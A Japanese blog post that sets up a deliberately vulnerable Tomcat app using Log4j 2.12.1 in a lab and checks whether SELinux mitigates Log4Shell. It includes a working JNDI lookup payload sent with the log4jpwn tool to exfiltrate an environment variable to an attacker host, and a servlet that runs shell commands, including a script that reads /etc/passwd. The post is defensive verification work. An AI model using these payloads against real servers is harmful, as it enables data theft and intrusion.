---
layout:        post
title:         "Log4j2の脆弱性がSELinuxで防げるかを検証する"
date:          2022-01-07
category:      Java
cover:         /assets/cover14.jpg
redirect_from:
comments:      true
published:     true
latex:         false
photoswipe:    false
syntaxhighlight: true
# sitemap: false
# feed:    false
---

CentOS に Tomcat をインストールし、Log4j2を使ったWebアプリで脆弱性を確認します。
実際のPoCでLog4j2経由でRCEを実行することはしていません。
Javaがtomcat_tドメインの下で動作している場合、デフォルトのポリシーで外部ホストへの接続を防ぐことができませんが、RCE脆弱性に対する緩和が可能です。

tomcat_t がデフォルトで外部ポートへ接続できることは、`sesearch -A -s tomcat_t -c tcp_socket` で確認することができます。

## やられサーバの準備

以下は検証作業手順です。

### Javaのインストール
今回はOpenJDK7のインストールして検証しました。
```bash
~]# yum install java-1.7.0-openjdk-devel
```

### Tomcatのインストール
```bash
~]# yum install tomcat
```
インストール後に tomcat.service ファイルが作成されたこととその中身を確認して、実行されるコマンドや設定ファイルの場所などを確認しておきます。
```bash
~]# cat /usr/lib/systemd/system/tomcat.service
```
systemdのtomcatファイル：
```config
[Unit]
Description=Apache Tomcat Web Application Container
After=syslog.target network.target

[Service]
Type=simple
EnvironmentFile=/etc/tomcat/tomcat.conf
Environment="NAME="
EnvironmentFile=-/etc/sysconfig/tomcat
ExecStart=/usr/libexec/tomcat/server start
SuccessExitStatus=143
User=tomcat

[Install]
WantedBy=multi-user.target
```
systemdコマンドで Tomcat を起動＆有効化しておきます。
```bash
~]# systemctl start tomcat
~]# systemctl enable tomcat
```

### mvnのインストール
Javaで動くWebアプリを作るために、依存関係を元にダウンロード＆ビルドしてくれるmvnコマンドをインストールします（Rubyのgem、Pythonのpipみたいなやつ）。
```bash
~]# curl -OL https://dlcdn.apache.org/maven/maven-3/3.8.4/binaries/apache-maven-3.8.4-bin.tar.gz
~]# mkdir /opt/apache-maven
~]# tar -xzvf apache-maven-3.8.4-bin.tar.gz -C /opt/apache-maven --strip-components=1

~]# /opt/apache-maven/bin/mvn --version
Apache Maven 3.8.4 (9b656c72d54e5bacbed989b64718c159fe39b537)
Maven home: /opt/apache-maven
Java version: 1.7.0_261, vendor: Oracle Corporation, runtime: /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.261-2.6.22.2.el7_8.x86_64/jre
Default locale: en_US, platform encoding: ANSI_X3.4-1968
OS name: "linux", version: "3.10.0-1160.el7.x86_64", arch: "amd64", family: "unix"
```

### Webアプリケーションの作成
まずは、mvnコマンドで初期フォルダ構造を生成します。
```bash
~]$ export PATH="$PATH:/opt/apache-maven/bin/"
~]$ mvn archetype:generate -DgroupId=myexample -DartifactId=log4j2-vulnapp -DarchetypeArtifactId=maven-archetype-webapp -DarchetypeVersion=1.4 -DinteractiveMode=false
~]$ cd log4j2-vulnapp/
~]$ find . -type f
./pom.xml
./src/main/webapp/WEB-INF/web.xml
./src/main/webapp/index.jsp
```

次に、Javaのソースコードを配置するためのディレクトリを作成します。
```bash
~]$ mkdir -p ./src/main/java/myexample/
```
上記のディレクトリに以下の内容で HelloServlet.java を作成します。
Javaの動作としては、/hello にアクセスが来たら「Hello World!!!」という文字列を返して、パラメータ name の内容をログに書き込む処理をします。

./src/main/java/myexample/HelloServlet.java
```java
package myexample;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@WebServlet(urlPatterns = "/hello")
public class HelloServlet extends HttpServlet {
    private static final Logger logger = LogManager.getLogger(HelloServlet.class);

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        ServletOutputStream out = resp.getOutputStream();
        out.println("<b>Hello World!!!</b>");
        out.flush();

        String name = req.getParameter("name");
        logger.info("name={}", name);
    }
}
```

web.xml はWebアプリに関する情報の設定ファイルです。
トップ画面 (/log4j2-vulnapp/) にアクセスしたときに HelloServlet (/log4j2-vulnapp/hello) が実行されるように設定を web.xml に追加します。

./src/main/webapp/WEB-INF/web.xml
```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>

  <welcome-file-list>
    <welcome-file>hello</welcome-file>
  </welcome-file-list>
</web-app>
```

pom.xml は依存関係やビルドについての設定ファイルです。
依存関係の追加 (log4j-core, log4j-api, javax.servlet) とビルド用プラグインの修正 (maven-war-plugin がJava7で動くようにダウングレード) と追加 (tomcat7-maven-plugin) をします。

./pom.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>myexample</groupId>
  <artifactId>log4j2-vulnapp</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>war</packaging>

  <name>log4j2-vulnapp Maven Webapp</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.7</maven.compiler.source>
    <maven.compiler.target>1.7</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
      <scope>test</scope>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.12.1</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-api</artifactId>
        <version>2.12.1</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api -->
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>javax.servlet-api</artifactId>
        <version>4.0.1</version>
        <scope>provided</scope>
    </dependency>
  </dependencies>

  <build>
    <finalName>log4j2-vulnapp</finalName>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-war-plugin</artifactId>
          <!--<version>3.2.2</version>-->
          <version>2.6</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <plugin>
          <groupId>org.apache.tomcat.maven</groupId>
          <artifactId>tomcat7-maven-plugin</artifactId>
          <version>2.2</version>
          <configuration>
            <path>/log4j2-vulnapp</path>
            <contextReloadable>true</contextReloadable>
          </configuration>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>
```

開発環境のフォルダ構成は最終的に以下のようになります。
```bash
~]$ find . -type f
./src/main/webapp/WEB-INF/web.xml
./src/main/webapp/index.jsp
./src/main/java/myexample/HelloServlet.java
./pom.xml
```

mavenを使ってビルドし、warファイルを作成します。
```bash
~]$ mvn package
```

ビルド結果 (warファイル) の内容を確認して、コンパイルした結果のクラスファイルが含まれていることを確認します。
```bash
~]$ jar tf target/log4j2-vulnapp.war
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/classes/
WEB-INF/classes/myexample/
WEB-INF/lib/
WEB-INF/web.xml
WEB-INF/classes/myexample/HelloServlet.class
WEB-INF/lib/log4j-core-2.12.1.jar
WEB-INF/lib/log4j-api-2.12.1.jar
index.jsp
META-INF/maven/myexample/log4j2-vulnapp/pom.xml
META-INF/maven/myexample/log4j2-vulnapp/pom.properties
```

warファイルを webapps ディレクトリ下に配置して、Webアプリのデプロイをします。
```bash
~]$ sudo cp ./target/log4j2-vulnapp.war /usr/share/tomcat/webapps/
```

アクセスできることを確認します。
```bash
~]$ curl http://192.168.56.105:8080/log4j2-vulnapp/
<b>Hello World!!!</b>
```

### log4j2の出力先ファイルの設定

log4j2の出力先ファイルを設定するために、log4j2の設定ファイルを作成して、適当な（わかりやすい）場所に配置します。
```bash
~]$ sudo vi /etc/tomcat/log4j2.xml
```
/etc/tomcat/log4j2.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="OFF">
    <Properties>
        <Property name="pattern">[%d{yyyy-MM-dd HH:mm:ss.SSS}] %-5p %-24c{1}- %m%n</Property>
    </Properties>
    <Appenders>
        <Console name="console" target="SYSTEM_OUT">
            <PatternLayout pattern="${pattern}" />
        </Console>
        <RollingFile name="catalina" fileName="/var/log/tomcat/catalina.log" filePattern="/var/log/tomcat/catalina_%d{yyyy-MM-dd}.gz">
            <PatternLayout pattern="${pattern}" />
            <Policies><TimeBasedTriggeringPolicy /></Policies>
        </RollingFile>
        <RollingFile name="localhost" fileName="/var/log/tomcat/localhost.log" filePattern="/var/log/tomcat/localhost_%d{yyyy-MM-dd}.gz">
            <PatternLayout pattern="${pattern}" />
            <Policies><TimeBasedTriggeringPolicy /></Policies>
        </RollingFile>
        <RollingFile name="manager" fileName="/var/log/tomcat/manager.log" filePattern="/var/log/tomcat/manager_%d{yyyy-MM-dd}.gz">
            <PatternLayout pattern="${pattern}" />
            <Policies><TimeBasedTriggeringPolicy /></Policies>
        </RollingFile>
        <RollingFile name="host-manager" fileName="/var/log/tomcat/host-manager.log" filePattern="/var/log/tomcat/host-manager_%d{yyyy-MM-dd}.gz">
            <PatternLayout pattern="${pattern}" />
            <Policies><TimeBasedTriggeringPolicy /></Policies>
        </RollingFile>
    </Appenders>
    <Loggers>
        <Logger name="org.apache.catalina.core.ContainerBase.[Catalina].[localhost]" level="info">
            <AppenderRef ref="console" />
            <AppenderRef ref="localhost"/>
        </Logger>
        <Logger name="org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/manager]" level="info" additivity="false">
            <AppenderRef ref="console" />
            <AppenderRef ref="manager"/>
        </Logger>
        <Logger name="org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/host-manager]" level="info" additivity="false">
            <AppenderRef ref="console" />
            <AppenderRef ref="host-manager"/>
        </Logger>
        <Root level="info">
            <AppenderRef ref="console" />
            <AppenderRef ref="catalina" />
        </Root>
    </Loggers>
</Configuration>
```

次に、tomcat起動時にlog4j2.xmlの設定を読み込むように修正します（JAVA_OPTSを設定ファイルの末尾に追加します）。
```bash
~]$ sudo vi /etc/tomcat/tomcat.conf
```
/etc/tomcat/tomcat.conf
```config
JAVA_OPTS="-Dlog4j.configurationFile=file:///etc/tomcat/log4j2.xml"
```
修正したらTomcatを再起動します。
```bash
~]$ sudo systemctl restart tomcat
```

<br>

## 攻撃側サーバの準備
以下は攻撃側サーバでの準備作業です。まずは、PoCを成功させるために、Log4Shellが接続する先の攻撃サーバのポートをFWで開けておきます。
```bash
~]$ sudo firewall-cmd --add-port=8888/tcp
~]$ #sudo firewall-cmd --runtime-to-permanent
~]$ sudo firewall-cmd --list-all
```

### log4j2で記録されるログ
Javaのプログラムの動作は、/hello にGETリクエストが来たら、クエリパラメータ「name」の内容をログに書き込む処理をします。
なので、クエリパラメータに「Alice」「${java:version}」「${env:PATH}」をそれぞれURLエンコードして送信してみます。

```bash
~]$ curl http://192.168.56.105:8080/log4j2-vulnapp/?name=Alice
~]$ curl http://192.168.56.105:8080/log4j2-vulnapp/?name=%24%7bjava%3aversion%7d
~]$ curl http://192.168.56.105:8080/log4j2-vulnapp/?name=%24%7benv%3aPATH%7d
```
ログの内容を確認すると、「${ }」の中身を評価して展開した文字列がログに記録されました。
評価する必要がない java:version (Javaのバージョン) や env:PATH (環境変数のPATH) が展開されていることが確認できます。
```bash
~]# tail -f /var/log/tomcat/catalina.log
[2021-12-30 12:00:00.000] INFO  HelloServlet   - name=Alice
[2021-12-30 12:00:01.000] INFO  HelloServlet   - name=Java version 1.7.0_261
[2021-12-30 12:00:02.000] INFO  HelloServlet   - name=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
```

### 評価した文字列の吸い上げ
サーバの環境変数などの文字列を攻撃者が取得するには、評価した文字列をパス含むURLで攻撃者サーバにアクセスさせる方法があります。
今回は GitHub で公開されている log4jpwn を使用します。
以下は、攻撃側サーバが 192.168.56.104 で、やられサーバが 192.168.56.105 のIPアドレスです。
```bash
~]$ git clone https://github.com/leonjza/log4jpwn
~]$ vi log4jpwn/pwn.py   # 送信時のクエリパラメータをnameに変更する
~]$ python3 log4jpwn/pwn.py --target http://192.168.56.105:8080/log4j2-vulnapp/ --exploit-host 192.168.56.104 --payload-query-string --leak '${env:PATH}'
 i| starting server on 0.0.0.0:8888
 i| server started
 i| setting payload in User-Agent header
 i| setting payload as query string 'name'
 i| sending exploit payload ${jndi:ldap://192.168.56.104:8888/${env:PATH}} to http://192.168.56.105:8080/log4j2-vulnapp/
 i| new connection from 192.168.56.105:33408
 v| extracted value: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
 i| new connection from 192.168.56.105:33410
 v| extracted value: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
 i| new connection from 192.168.56.105:33412
 v| extracted value: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
 i| new connection from 192.168.56.105:33414
 v| extracted value: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
 i| request url was: http://192.168.56.105:8080/log4j2-vulnapp/?name=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.104%3A8888%2F%24%7Benv%3APATH%7D%7D
 i| response status code: 200
```
やられサーバ側のログには、以下のようなログが残ります。
攻撃者のサイトにアクセスしてもシリアライズされたJavaコードが取得できなかった場合は元の文字列がそのまま出力されるようです。
```bash
~]# tail -f /var/log/tomcat/catalina.log
[2021-12-30 12:00:03.000] INFO  HelloServlet   - name=${jndi:ldap://192.168.56.104:8888/${env:PATH}}
```
攻撃者のサイトにアクセスしたときに、シリアライズされたJavaコードが取得できた場合は、そのインスタンスを文字列にした結果がログに記録されます。
```bash
~]# tail -f /var/log/tomcat/catalina.log
[2021-12-30 12:00:00.000] INFO  HelloServlet   - name=com.sun.jndi.ldap.LdapCtx@24a0ff23
```

<br>

### SELinuxによる脆弱性の緩和

続いては、SELinuxによってLog4Shellの攻撃を緩和できるか確認していきます。
yum 経由で tomcat をインストールした場合は、Tomcat はデフォルトで tomcat_t ドメインで動作します。
```bash
~]$ ps axwZ | grep tomcat
system_u:system_r:tomcat_t:s0    3186 ?        Ssl    0:12 java -Dlog4j.configurationFile=file:///etc/tomcat/log4j2.xml -classpath /usr/share/tomcat/bin/bootstrap.jar:/usr/share/tomcat/bin/tomcat-juli.jar:/usr/share/java/commons-daemon.jar -Dcatalina.base=/usr/share/tomcat -Dcatalina.home=/usr/share/tomcat -Djava.endorsed.dirs= -Djava.io.tmpdir=/var/cache/tomcat/temp -Djava.util.logging.config.file=/usr/share/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager org.apache.catalina.startup.Bootstrap start
```
SELinuxのポリシーを確認すると、tomcat は外部の ldap_port_t (389, 636, 3268, 3269, 7389) や unreserved_port_t (サービスが使わないポート番号) への接続が標準で許可されているため、デフォルト設定ではやられサーバ内の環境変数を取得する攻撃は防ぐことができません。
```bash
~]# sesearch -A -s tomcat_t -c tcp_socket
...
allow tomcat_domain ldap_port_t:tcp_socket name_connect;
allow tomcat_domain unreserved_port_t:tcp_socket name_connect;
...
```

しかし、tomcat_t ドメインで動作しているので、Tomcat が通常アクセスしてよいディレクトリやファイル以外は、アクセスできなくなります。

具体的には tomcat_t, tomcat_cache_t, tomcat_tmp_t, tomcat_var_lib_t, tomcat_var_run_t, tomcat_exec_t, tomcat_log_t のタグが割り当てられているファイルやディレクトリにだけアクセスできるような状態になっています（詳細はPolicyのルールを確認する必要がありますが）。

以下は書き込みが許可されているディレクトリやフォルダの確認方法です。
```bash
~]# sesearch -A -s tomcat_t -c dir
~]# sesearch -A -s tomcat_t -c file
```

### 補足：tomcat_t ドメインでのアクセス制限

以下は、Tomcat で想定外のディレクトリやファイルへのアクセスは拒否されることの検証です。
権限が777の（誰でもアクセス可能な）ディレクトリ /backup を作成して、そこに tomcat_t プロセスがアクセスできないことを確認します。
```bash
~]$ sudo mkdir /backup
~]$ sudo chmod go+w /backup
~]$ sudo ls -ldZ /backup
drwxrwxrwx. root root unconfined_u:object_r:default_t:s0 /backup
```
localhost:8080/hello にアクセスすると /backup フォルダにファイル「z」を作成する Java コードを用意します。

./src/main/java/myexample/LoginServlet.java
```java
package myexample;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.Runtime;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(urlPatterns = "/login")
public class LoginServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        PrintWriter out = resp.getWriter();
        out.println("<b>Hello World!!!</b> (login)");

        String command = "touch /backup/z";
        try {
            Process process = Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
ビルドして war ファイルを tomcat/webapps に配置します。
```bash
~]$ mvn package
~]$ sudo cp ./target/log4j2-vulnapp.war /usr/share/tomcat/webapps/
```
配置したら、対象のURLにアクセスします。
```bash
~]$ curl http://192.168.56.105:8080/log4j2-vulnapp/login
```
やられサーバ側の監査ログ (/var/log/audit/audit.log) に拒否ログが記録されます。
tomcat_t ドメインは default_t タイプのディレクトリに書き込むルールがポリシーに存在しないからです。
```
type=AVC msg=audit(0000000000.101:285): avc:  denied  { write } for  pid=2650 comm="touch" name="backup" dev="dm-0" ino=461895 scontext=system_u:system_r:tomcat_t:s0 tcontext=unconfined_u:object_r:default_t:s0 tclass=dir permissive=1
```

ついでにファイル実行が拒否されることも確認してみます。/tmp 直下に z という実行可能ファイルを作成して、これをTomcat経由で実行してみます。
```bash
~]$ cat <<'EOS' > /tmp/z
#!/bin/bash
cat /etc/passwd
EOS
chmod +x /tmp/z
```
Javaのコードを修正して再コンパイルし、warファイルをwebappsに配置します。
```java
        String command = "/tmp/z";
```
配置後にアクセスすると、/var/log/audit/audit.log には java コマンドによるファイル z の実行が拒否された記録が残ります。
tomcat_t ドメインは default_t タイプのファイルを実行できるルールがポリシーに存在しないからです。
```
[root@localhost ~]# tail -f /var/log/audit/audit.log | grep 'denied'
type=AVC msg=audit(0000000000.207:392): avc:  denied  { execute } for  pid=4733 comm="java" name="z" dev="dm-0" ino=17271392 scontext=system_u:system_r:tomcat_t:s0 tcontext=system_u:object_r:tomcat_tmp_t:s0 tclass=file permissive=0
```

以上です。


### 参考文献

- [dbgee/log4j2_rce: log4j2 rce、poc](https://github.com/dbgee/log4j2_rce)
- [leonjza/log4jpwn: log4j rce test environment and poc](https://github.com/leonjza/log4jpwn)
- [log4j-scanner/log4j-scan.py at master · cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner/blob/master/log4-scanner/log4j-scan.py)
- [Log4j – Configuring Log4j 2](https://logging.apache.org/log4j/2.x/manual/configuration.html)
- [How to Execute Operating System Commands in Java](https://www.codejava.net/java-se/file-io/execute-operating-system-commands-using-runtime-exec-methods)

その他参考程度：

- [How To Install Apache Tomcat 8 on CentOS 7 \| DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-install-apache-tomcat-8-on-centos-7)
- [SELinux/iptablesとApache Log4jの任意のコード実行の脆弱性(Log4Shell: CVE-2021-44228) - security.sios.com](https://security.sios.com/security/apache-log4j-selinux-poc-20211219.html)
- [jarコマンドを使ってjarファイル、warファイルを作る方法 - Qiita](https://qiita.com/Qui/items/14961678ef939673f744)
- [Loading Log4j.xml from outside fo the war - Stack Overflow](https://stackoverflow.com/questions/4024361/loading-log4j-xml-from-outside-fo-the-war/43988527)
- [No log4j2 configuration file found. Using default configuration: logging only errors to the console](https://newbedev.com/no-log4j2-configuration-file-found-using-default-configuration-logging-only-errors-to-the-console)
- [Tomcatのwarファイルとデプロイと自動展開 - ろば電子が詰まつてゐる](https://ozuma.hatenablog.jp/entry/20131227/1388151846)
